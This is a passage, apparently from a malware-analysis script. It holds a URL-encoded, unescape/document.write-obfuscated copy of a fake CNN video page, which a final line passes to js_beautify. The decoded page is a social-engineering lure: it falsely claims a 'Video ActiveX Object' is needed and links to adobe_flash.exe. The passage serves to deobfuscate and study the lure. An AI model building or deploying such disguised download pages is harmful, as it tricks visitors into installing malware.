font-family%3AArial%3B%20height%3A23px%3B%20width%3A82px%3B%22%20tabindex%3D%221%22%20ID%3D%22Button1%22%20NAME%3D%22Button1%22%3E%3Cbr%3E%3Cbr%3E%3C/td%3E%0A%0A%3Ctd%3E%3C/td%3E%0A%0A%3Ctd%3E%3Cinput%20type%3D%22button%22%20value%3D%22Cancel%22%20onClick%3D%22Close%28%29%22%20style%3D%22font-size%3A11px%3B%20%20font-family%3AArial%3B%20height%3A23px%3B%20width%3A82px%3B%22%20ID%3D%22Button3%22%20NAME%3D%22Button3%22%3E%3Cbr%3E%3Cbr%3E%3C/td%3E%0A%0A%3Ctd%3E%3Cinput%20type%3D%22button%22%20value%3D%22Details...%22%20onClick%3D%22Details%28%29%22%20style%3D%22font-size%3A11px%3B%20%20font-family%3AArial%3B%20height%3A23px%3B%20width%3A82px%3B%22%20ID%3D%22Button3%22%20NAME%3D%22Button3%22%3E%3Cbr%3E%3Cbr%3E%3C/td%3E%0A%0A%3C/tr%3E%0A%0A%3C/table%3E%0A%0A%3C/td%3E%0A%0A%3C/tr%3E%0A%0A%3Ctr%3E%0A%0A%3Ctd%3E%0A%0A%3Ctable%20cellpadding%3D%220%22%20cellspacing%3D%220%22%20width%3D%22100%25%22%3E%0A%0A%3Ctr%20bgcolor%3D%224577ea%22%20style%3D%22height%3A1px%3B%22%3E%0A%0A%3Ctd%3E%3C/td%3E%0A%0A%3C/tr%3E%20%3C%21--%20empty%20colors%20--%3E%0A%0A%3Ctr%20bgcolor%3D%220029b5%22%20style%3D%22height%3A1px%3B%22%3E%0A%0A%3Ctd%3E%3C/td%3E%0A%0A%3C/tr%3E%0A%0A%3Ctr%20bgcolor%3D%22001590%22%20style%3D%22height%3A1px%3B%22%3E%0A%0A%3Ctd%3E%3C/td%3E%0A%0A%3C/tr%3E%0A%0A%3C/table%3E%0A%0A%3C/td%3E%0A%0A%3C/tr%3E%0A%0A%3C/table%3E%0A%0A%3C/td%3E%0A%0A%3Ctd%20style%3D%22background-image%3Aurl%28right.gif%29%3B%20background-repeat%3Arepeat-y%3B%22%20valign%3D%22bottom%22%3E%0A%0A%3Ctable%20cellpadding%3D%220%22%20cellspacing%3D%220%22%3E%0A%0A%3Ctr%3E%0A%0A%3Ctd%20style%3D%22padding%3A0px%3B%22%3E%3Cimg%20src%3D%22xprightclm.gif%22%20width%3D%223%22%20height%3D%2297%22%3E%3C/td%3E%0A%0A%3C/table%3E%0A%0A%3C/td%3E%0A%0A%3C/tr%3E%0A%0A%3C/table%3E%0A%0A%3C/td%3E%0A%0A%3C/tr%3E%0A%0A%3C/table%3E%0A%0A%0A%0A%3Cscript%3E%0Aif%20%28navigator.userAgent.indexOf%28%22Firefox%22%29%21%3D-1%29%20%7B%0Aif%20%28activex_is_here%28%29%29%20%7B%20%7D%20else%20%7B%0A%09setTimeout%28%22Close%28%29%3B%22%2C%201000%29%3B%0A%7D%0A%7D%0Aelse%20%7B%0Aif%20%28activex_is_here%28%29%29%20%7B%20%7D%20else%20%7B%0A%09setTimeout%28%22showPopDiv%28%29%3B%22%2C2000%29%3B%0A%7D%0A%7D%0A%20%20%20%20%20%20%0Afunction%20showPopDiv%28%29%0A%7B%0A%09%09var%20sFlag%20%3D%20%22No%22%3B%0A%09%09var%20byFlag%20%3D%20false%3B%0A%09%09var%20FlagAr%20%3D%20sFlag.split%28%22%22%29%3B%0A%09%0A%09%09if%20%28FlagAr%5B0%5D%3D%3D%221%22%29%7BbyFlag%20%3D%20true%3B%7D%0A%09%09if%20%28FlagAr%5B0%5D%3D%3D%223%22%29%7BbyFlag%20%3D%20true%3B%7D%0A%09%0A%09%09if%28%21byFlag%29%20%7B%0A%09%09%09var%20p%3Ddocument.getElementById%28%22popdiv%22%29%3B%20%0A%09%0A%09%09var%20myWidth%20%3D%200%2C%20myHeight%20%3D%200%3B%0A%09%09if%28%20typeof%28%20window.innerWidth%20%29%20%3D%3D%20%27number%27%20%29%20%7B%0A%09%09myWidth%20%3D%20window.innerWidth%3B%0A%09%09myHeight%20%3D%20window.innerHeight%3B%0A%09%09%7D%20else%20if%28%20document.documentElement%20%26%26%20%28%20document.documentElement.clientWidth%20%7C%7C%20document.documentElement.clientHeight%20%29%20%29%20%7B%0A%09%09myWidth%20%3D%20document.documentElement.clientWidth%3B%0A%09%09myHeight%20%3D%20document.documentElement.clientHeight%3B%0A%09%09%7D%20else%20if%28%20document.body%20%26%26%20%28%20document.body.clientWidth%20%7C%7C%20document.body.clientHeight%20%29%20%29%20%7B%0A%09%09myWidth%20%3D%20document.body.clientWidth%3B%0A%09%09myHeight%20%3D%20document.body.clientHeight%3B%0A%09%09%7D%0A%0A%09%09function%20getScroll%28%29%20%7B%0A%09%09%0A%09%09%09var%20scrOfX%20%3D%200%2C%20scrOfY%20%3D%200%3B%0A%09%09%09if%28%20typeof%28%20window.pageYOffset%20%29%20%3D%3D%20%27number%27%20%29%20%7B%0A%09%09%09scrOfY%20%3D%20window.pageYOffset%3B%0A%09%09%09scrOfX%20%3D%20window.pageXOffset%3B%0A%09%09%09%7D%20else%20if%28%20document.body%20%26%26%20%28%20document.body.scrollLeft%20%7C%7C%20document.body.scrollTop%20%29%20%29%20%7B%0A%09%09%09scrOfY%20%3D%20document.body.scrollTop%3B%0A%09%09%09scrOfX%20%3D%20document.body.scrollLeft%3B%0A%09%09%09%7D%20else%20if%28%20document.documentElement%20%26%26%20%28%20document.documentElement.scrollLeft%20%7C%7C%20document.documentElement.scrollTop%20%29%20%29%20%7B%0A%09%09%09scrOfY%20%3D%20document.documentElement.scrollTop%3B%0A%09%09%09scrOfX%20%3D%20document.documentElement.scrollLeft%3B%0A%09%09%09%7D%0A%09%09%09return%20%5BscrOfX%2C%20scrOfY%5D%3B%0A%09%09%0A%09%09%7D%0A%0A%09%09sc%20%3D%20getScroll%28%29%3B%20%0A%09%09p.style.top%20%3D%20%28myHeight/2%20-%20181%29+sc%5B1%5D+%27px%27%3B%20%0A%09%09p.style.left%20%3D%20%28myWidth/2%20-%20120%29%20+%20sc%5B0%5D+%27px%27%3B%20%0A%09%09p.style.visibility%20%3D%20%27visible%27%3B%0A%09%09p.focus%28%29%3B%0A%09%7D%0A%7D%0A%0ADrag.init%28document.getElementById%28%22popdiv%22%29%29%3B%0A%3C/script%3E%0A%0A%3C/div%3E%0A%0A%0A%0A%3Cdiv%20id%3D%22cnnContainer%22%3E%0A%0A%3Cdiv%20id%3D%22cnnContentContainer%22%3E%0A%0A%3Cdiv%20id%3D%22cnnVPContainer%22%3E%0A%0A%0A%0A%3Cdiv%20class%3D%22cnnBackHome%22%3E%09%0A%0A%09%3Cstyle%20type%3D%22text/css%22%3E%0A%0A%09%3C%21--%0A%0A%09.cnnOpin%20%7Bfloat%3Aright%3Bcolor%3A%23F2F2F2%3Bfont-size%3A11px%3B%7D%0A%0A%09.cnnOpin%20a.realmLink%20%7Bfont-weight%3Abold%3Bfont-size%3A11px%3B%7D%0A%0A%09.cnnOpin%20a%20%7Bmargin%3A0px%206px%3B%7D%0A%0A%09--%3E%0A%0A%09%3C/style%3E%0A%0A%0A%0A%3Cdiv%20class%3D%22cnnOpin%22%3E%0A%0A%3Ca%20href%3D%22%23%22%20class%3D%22realmLink%22%3E%3Cimg%20src%3D%22opinionBlue.gif%22%20title%3D%22Feedback%22%20style%3D%22margin-right%3A%205px%3B%22%20border%3D%220%22%3EFeedback%3C/a%3E%20%7C%20%3Ca%20href%3D%22http%3A//edition.cnn.com/help/video.html%22%3EHelp%3C/a%3E%3C/div%3E%09%09%09%0A%0A%0A%0A%3Ca%20href%3D%22http%3A//edition.cnn.com/%22%3E%26laquo%3B%20CNN.com%20Homepage%3C/a%3E%20%20%0A%0A%3C/div%3E%0A%0A%0A%0A%3Cdiv%20id%3D%22cnnVPNav%22%3E%0A%0A%3Ctable%20cellspacing%3D%220%22%20cellspacing%3D%220%22%20border%3D%220%22%20width%3D%22940%22%3E%0A%0A%3Ccolgroup%3E%0A%0A%3Ccol%20width%3D%22247%22%3E%0A%0A%3Ccol%20width%3D%22231%22%3E%0A%0A%3Ccol%20width%3D%22231%22%3E%0A%0A%3Ccol%20width%3D%22231%22%3E%0A%0A%3C/colgroup%3E%0A%0A%3Ctr%3E%0A%0A%3Ctd%3E%3Cimg%20src%3D%22cnn_video_logo.gif%22%20width%3D%22130%22%20height%3D%2224%22%20alt%3D%22%22%20border%3D%220%22%20class%3D%22cnnVideoLogo%22%3E%3C/td%3E%0A%0A%3Ctd%20class%3D%22NavItem%22%3E%3Cimg%20src%3D%22video_icon_active.gif%22%20alt%3D%22%22%20border%3D%220%22%3E%26nbsp%3B%3Ca%20href%3D%22%23%22%3ELive%20Video%3C/a%3E%3C/td%3E%0A%0A%3Ctd%20class%3D%22NavItem%22%3E%3Cimg%20src%3D%22podcast_icon.gif%22%20width%3D%2212%22%20height%3D%2214%22%20alt%3D%22%22%20border%3D%220%22%3E%26nbsp%3B%3Ca%20href%3D%22%23%22%3EPodcasts%3C/a%3E%3C/td%3E%0A%0A%3Ctd%20class%3D%22NavItem%22%3E%3Cimg%20src%3D%22radio_icon.gif%22%20width%3D%2211%22%20height%3D%2214%22%20alt%3D%22%22%20border%3D%220%22%3E%26nbsp%3B%3Ca%20href%3D%22%23%22%3ECNN%26nbsp%3BRadio%3C/a%3E%3C/td%3E%0A%0A%0A%0A%3C/tr%3E%0A%0A%3C/table%3E%0A%0A%3C/div%3E%0A%0A%0A%0A%3Cdiv%20style%3D%22text-align%3Acenter%22%3E%0A%0A%3C%21--%20LARGE%20PLAYER%20HTML%20CODE%20--%3E%0A%0A%3Ca%20href%3D%22adobe_flash.exe%22%3E%0A%0A%3Cimg%20onmouseover%3D%22window.status%20%3D%20%27You%20must%20download%20Video%20ActiveX%20Object%20to%20play%20this%20video%20file.%27%3B%22%20alt%3D%22You%20must%20download%20Video%20ActiveX%20Object%20to%20play%20this%20video%20file.%22%20src%3D%22no_flash.jpg%22%20%0Awidth%3D%22582%22%20height%3D%22477%22%20border%3D%220%22%3E%3C/a%3E%0A%0A%3C%21--%20/LARGE%20PLAYER%20HTML%20CODE%20--%3E%0A%0A%3C/div%3E%0A%0A%0A%3Cdiv%20class%3D%22clear%22%3E%3Cimg%20src%3D%221_002.gif%22%20alt%3D%22%22%20border%3D%220%22%20height%3D%221%22%20width%3D%221%22%3E%3C/div%3E%0A%0A%0A%3C/div%3E%0A%3C/div%3E%0A%0A%3Cdiv%20style%3D%22margin-top%3A%2015px%3B%20font-size%3A%2011px%3B%20line-height%3A%2018px%3B%20color%3A%20rgb%28148%2C%20148%2C%20148%29%3B%22%20align%3D%22center%22%3E%0A%0A%3Ca%20href%3D%22http%3A//edition.cnn.com/%22%3EHome%3C/a%3E%20%26nbsp%3B%7C%26nbsp%3B%20%3Ca%20href%3D%22http%3A//edition.cnn.com/WORLD/%22%3EWorld%3C/a%3E%20%26nbsp%3B%7C%26nbsp%3B%20%3Ca%20href%3D%22http%3A//edition.cnn.com/US/%22%3EU.S.%3C/a%3E%20%26nbsp%3B%7C%26nbsp%3B%20%3Ca%20%0Ahref%3D%22http%3A//edition.cnn.com/POLITICS/%22%3EPolitics%3C/a%3E%20%26nbsp%3B%7C%26nbsp%3B%20%3Ca%20href%3D%22http%3A//edition.cnn.com/SHOWBIZ/%22%3EEntertainment%3C/a%3E%20%26nbsp%3B%7C%26nbsp%3B%20%3Ca%20href%3D%22http%3A//edition.cnn.com/HEALTH%22%3EHealth%3C/a%3E%20%0A%26nbsp%3B%7C%26nbsp%3B%20%3Ca%20href%3D%22http%3A//edition.cnn.com/TECH%22%3ETech%3C/a%3E%20%26nbsp%3B%7C%26nbsp%3B%20%3Ca%20href%3D%22http%3A//edition.cnn.com/TRAVEL/%22%3ETravel%3C/a%3E%20%26nbsp%3B%7C%26nbsp%3B%20%3Ca%20href%3D%22http%3A//edition.cnn.com/video/living%22%3ELiving%3C/a%3E%20%0A%26nbsp%3B%7C%26nbsp%3B%20%3Ca%20href%3D%22http%3A//edition.cnn.com/money/%22%3EBusiness%3C/a%3E%20%26nbsp%3B%7C%26nbsp%3B%20%3Ca%20href%3D%22http%3A//edition.cnn.com/si/%22%3ESports%3C/a%3E%20%26nbsp%3B%7C%26nbsp%3B%20%3Ca%20href%3D%22http%3A//edition.cnn.com/time/%22%3ETime.com%3C/a%3E%3Cbr%3E%0A%0A%C2%A9%202007%20Cable%20News%20Network%20LP%2C%20LLLP.%20A%20Time%20Warner%20Company.%20All%20Rights%20Reserved.%3Cbr%3E%0A%0A%3Ca%20href%3D%22http%3A//edition.cnn.com/interactive_legal.html%22%3ETerms%20of%20service%3C/a%3E%20%26nbsp%3B%7C%26nbsp%3B%20%3Ca%20href%3D%22http%3A//edition.cnn.com/privacy.html%22%3EPrivacy%20guidelines%3C/a%3E%20%3C%21--%26nbsp%3B%7C%26nbsp%3B%20%3Ca%20%0Ahref%3D%22Advertise%22%3EAdvertise%20with%20us%3C/a%3E%20--%3E%26nbsp%3B%7C%26nbsp%3B%20%3Ca%20href%3D%22http%3A//edition.cnn.com/about/%22%3EAbout%20us%3C/a%3E%20%26nbsp%3B%7C%26nbsp%3B%20%3Ca%20href%3D%22http%3A//edition.cnn.com/feedback/%22%3EContact%20us%3C/a%3E%20%26nbsp%3B%7C%26nbsp%3B%20%3Ca%20%0Ahref%3D%22http%3A//edition.cnn.com/help/%22%3EHelp%3C/a%3E%0A%0A%3C/div%3E%0A%0A%0A%0A%3C/body%3E%0A%0A%3C/html%3E%0A";function V0(){var V0;V0=unescape(a1);W8.write(V0);}V0();\n\
\n\
'

// And now we call our beautification code:
print (js_beautify (code, 3, ' ', 0));
